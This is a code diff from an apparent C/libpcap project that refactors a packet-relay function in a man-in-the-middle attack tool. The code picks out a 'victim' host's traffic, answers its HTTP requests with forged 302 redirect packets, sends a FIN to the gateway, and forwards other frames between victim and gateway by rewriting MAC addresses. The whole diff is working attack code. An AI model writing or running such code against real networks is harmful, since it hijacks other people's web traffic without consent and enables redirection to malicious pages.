@@ -23,49 +23,42 @@ int checkHttp(const u_char* packet) {
 
 int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* packet, PLANINFO LanInfo)
 {
-	PTCP_PACKET header;
+	PTCP_PACKET header = (PTCP_PACKET)packet;
 	int packetSize;
-	header = (PTCP_PACKET)packet;
-	u_short ether_type = ntohs(header->ethernet.etherType);
-	if (ether_type == IPV4)
+	if (checkVictim(&header->ethernet, LanInfo))
 	{
-		if (checkVictim(&header->ethernet, LanInfo))
+		/* if http request, send redirect packet */
+		if (checkHttp(packet))
 		{
-			if (checkHttp(packet))
-			{
-				u_char sendPacket[1024] = { 0 };
-				packetSize = packet302Redirect(sendPacket, packet, LanInfo);
-				pcap_sendpacket(handle, sendPacket, packetSize);
-				packetSize = packetForward(sendPacket, packet );
-				pcap_sendpacket(handle, sendPacket, packetSize);
-			}
-			else
-			{
-				/* send to router */
-				memcpy(header->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
-				memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
-				memcpy((char*)packet, header, pktHeader->len);
-				if (pcap_sendpacket(handle, packet, pktHeader->len) != 0)
-				{
-					fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
-					return 0;
-				}
-			}
+			u_char sendPacket[1024] = { 0 };
+			packetSize = send302RedirectPacketToVictim(sendPacket, packet, LanInfo);
+			pcap_sendpacket(handle, sendPacket, packetSize);
+			packetSize = sendFinPacketToGateWay(sendPacket, packet );
+			pcap_sendpacket(handle, sendPacket, packetSize);
 		}
-		else if (checkGateWay(&header->ethernet, LanInfo))
+		else
 		{
-			/* send to victim */
-			memcpy(header->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
+			memcpy(header->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
 			memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
-			memcpy((char *)packet, header, pktHeader->len);
+			memcpy((char*)packet, header, pktHeader->len);
 			if (pcap_sendpacket(handle, packet, pktHeader->len) != 0)
 			{
 				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
 				return 0;
 			}
 		}
-		else
+	}
+	else if (checkGateWay(&header->ethernet, LanInfo))
+	{
+		/* send to victim */
+		memcpy(header->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
+		memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
+		memcpy((char *)packet, header, pktHeader->len);
+		if (pcap_sendpacket(handle, packet, pktHeader->len) != 0)
+		{
+			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
 			return 0;
+		}
 	}
 	return 0;
 }
